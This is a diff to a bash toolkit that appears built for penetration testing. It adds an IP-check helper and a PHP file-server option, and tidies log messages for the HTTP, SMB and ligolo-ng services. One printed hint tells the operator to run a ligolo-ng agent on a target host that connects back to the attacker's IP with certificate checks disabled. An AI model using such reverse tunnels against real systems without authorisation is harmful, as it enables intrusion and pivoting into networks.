@@ -180,6 +180,14 @@ function _cmd_is_exist() {
     fi
 }
 
+function _is_ip() {
+    if [[ "$1" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+        echo 1
+    else
+        echo 0
+    fi
+}
+
 # Description: wrap a function execution.
 # Usage: _wrap <commands>
 # TODO: extend to all functions.
@@ -267,19 +275,23 @@ function svc() {
             _wrap python3 -m pyftpdlib -w -p 21
             ;;
         http)
-
             local port="80"
             [[ $2 == "-p" || $2 == "--port" ]] && port=$3
 
             swiss_logger info "[i] start http server"
-            swiss_logger warn "[w] python3 -m http.server $port"
             i
             _wrap python3 -m http.server $port
             ;;
+        php)
+            local port="80"
+            [[ $2 == "-p" || $2 == "--port" ]] && port=$3
+            swiss_logger info "[i] start php server"
+            i
+            _wrap php -S 0.0.0.0:$port
+            ;;
         smb)
             swiss_logger info "[i] start smb server"
-            swiss_logger info "[i] impacket-smbserver smb . -smb2support"
-            swiss_logger info "[i] using default name smb"
+            swiss_logger info "[i] using share name 'smb'"
             i
             _wrap impacket-smbserver smb . -smb2support
             ;;
@@ -317,7 +329,7 @@ function svc() {
             _extension_fn_banner
             swiss_logger warn "[w] one-time setup: sudo ip tuntap add user $(whoami) mode tun ligolo; sudo ip link set ligolo up"
             swiss_logger info "[i] Example (On target): "
-            swiss_logger info "[i] Linux: .\ligolo-ng_agent_0.6.2_linux_amd64 -connect $(_get_default_network_interface_ip):443 -ignore-cert"
+            swiss_logger info "[i] Linux: ./ligolo-ng_agent_0.6.2_linux_amd64 -connect $(_get_default_network_interface_ip):443 -ignore-cert"
             swiss_logger info "[i] Windows: .\ligolo-ng_agent_0.6.2_windows_amd64.exe -connect $(_get_default_network_interface_ip):443 -ignore-cert"
             swiss_logger info "[i] after connection: "
             swiss_logger info "[i] > session                                    # choose the session"
